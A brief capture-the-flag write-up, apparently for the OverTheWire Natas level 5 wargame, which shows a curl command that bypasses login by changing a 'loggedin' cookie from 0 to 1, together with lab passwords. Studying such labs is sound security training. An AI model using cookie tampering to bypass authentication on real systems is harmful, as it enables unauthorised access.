aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

For this one, there is a cookie value that prevents login access. The cookie is called "loggedin" and its value is 0. To gain entry, we set loggedin equal to 1:

```bash
curl --cookie loggedin=1 --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
```
